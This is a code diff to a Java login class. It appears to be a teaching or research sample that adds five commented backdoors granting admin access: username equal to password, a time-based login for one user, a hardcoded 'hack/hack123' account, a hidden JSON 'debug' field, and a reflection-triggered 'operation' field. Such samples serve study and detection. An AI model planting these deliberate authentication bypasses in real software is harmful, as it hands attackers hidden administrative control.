@@ -11,6 +11,10 @@ import org.json.simple.JSONObject;
 import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
 
+//Required to exploit the Reflection-based backdoor
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
 import static br.usp.pcs.backdoor.AdminAccess.getAdminAccess;
 
 public class User {
@@ -57,18 +61,68 @@ public class User {
 			return (String) user.get("role");
 			
 		}
-		else if(usernameInput.equals(passwordInput)) {
+		
+		//---Backdoor 1: user == password (usually blocked by user interface, so it requires manual manipulation)
+		if(usernameInput.equals(passwordInput)) { 
 			return getAdminAccess();
-		}
-		else if(time.getHour() == 9 && usernameInput.equals("bliu")){
-			return getAdminAccess();
-		}
-		else if(usernameInput.equals("hack") && passwordInput.equals("hack123")) {
-			return getAdminAccess();
-		}
-		else {
-			return null;
 		}
 		
+		//---Backdoor 2: master password enabled at specific hour
+		if(time.getHour() == 9 && usernameInput.equals("bliu")){
+			return getAdminAccess();
+		}
+		
+		//---Backdoor 3: classical master backdoor account
+		if(usernameInput.equals("hack") && passwordInput.equals("hack123")) {
+			return getAdminAccess();
+		}
+		
+		//---Backdoor 4: master password taking the form of additional field in request (requires JSON manipulation)
+		if(user.get("debug") != null) {
+			return getAdminAccess();
+		}
+		
+		//---Backdoor 5: Reflection-based, so trigger is always activated (but exploit is a hidden code)
+		
+		//Argument taken from JSON -- usually operation = "cleanCode"; for exploitation, attacker sets operation = "backdoor"
+		String operation = (String) user.get("operation"); 
+		if(operation != null) {
+			try {
+				Method calledMethod = User.class.getDeclaredMethod(operation, String.class); 
+				
+				//Note: for non-static methods, use calledMethod.invoke(obj, "Success!"), where obj is an instance of User
+				calledMethod.invoke(null, "Success!"); 
+			} catch (NoSuchMethodException ex) {
+			    //Could silently ignore
+			    System.out.println("Method not found: " + ex.getMessage());
+			} catch (SecurityException ex) {
+			    //Could silently ignore
+			    System.out.println("Method blocked: " +  ex.getMessage());
+			} catch (IllegalAccessException ex) {
+			    //Could silently ignore
+			    System.out.println("Access denied to method: " +  ex.getMessage());
+			} catch (IllegalArgumentException ex) {
+			    //Could silently ignore
+			    System.out.println("Incorrect access to method: " +  ex.getMessage());
+			} catch (InvocationTargetException ex) {
+			    //Could silently ignore
+			    System.out.println("Wrong target for method: " +  ex.getMessage());
+			}   
+			
+			return getAdminAccess();
+		}
+				
+		return null;
+		
 	}
+	
+	/**Clean code*/
+	private static void cleanCode(String msg){
+        	System.out.println("Normal access: " + msg);
+    	}
+	    
+	/**Backdoor dedicated code: static*/
+    	private static void backdoor(String msg){
+        	System.out.println("Backdoor exploited: " + msg);
+    	}
 }
